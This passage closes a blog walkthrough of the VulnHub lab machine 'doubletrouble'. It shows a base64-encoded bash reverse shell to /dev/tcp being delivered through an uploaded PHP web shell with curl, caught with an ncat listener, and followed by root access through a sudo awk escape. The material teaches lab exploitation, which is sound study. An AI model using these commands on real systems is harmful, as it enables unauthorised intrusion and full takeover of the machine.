╭─ via [vh/doubletrouble]
╰─ echo "/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/12345 0&gt;&amp;1" | base64                                                                                                                                              
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==
╭─ via [vh/doubletrouble]
╰─ curl -s 'http://192.168.56.29/uploads/users/970086-lmfao.phtml?c=echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==+|+base64+-d+|+bash'

--

╭─ via [vh/doubletrouble]
╰─ ncat -nvlp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 192.168.56.29.
Ncat: Connection from 192.168.56.29:59362.
bash: cannot set terminal process group (467): Inappropriate ioctl for device
bash: no job control in this shell
www-data@doubletrouble:/var/www/html/uploads/users$
</code></pre></div></div>

<h2 id="shell-as-root">shell as root</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@doubletrouble:/var/www/html/uploads/users$ sudo /usr/bin/awk 'BEGIN{system("/bin/bash")}'
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div></div>

  </div>
  <div class="post-info" style="padding-top: 25px">
    <div class="post-date">
      2022-11-16.
    </div>
    <div class="post-categories">
      <span></span>
      
      <a href="/category/vulnhub" class="post-category">vulnhub</a>
      
    </div>
    <div class="post-tags">
      <span></span>
      
      <a href="/tag/rce" class="post-tag">RCE</a>
      
      <a href="/tag/awk" class="post-tag">awk</a>
      
    </div>
    <div class="post-tools">
      
      <div>
        <span></span><a href="/vh-beelzebub">VulnHub: Beelzebub</a>
      </div>
      
      
      <div>
        <span></span><a href="/hmv-suidyrevenge">HackMyVM: suidyrevenge</a>
      </div>
      
    </div>
    
  </div>
</article>

    </main>
    <footer class="container-footer">
      <div class="footer-copyright">
  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
  <span class="footer-copyright-text float-right">
    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
  </span>
</div>

    </footer>
  </div>
</body>
</html>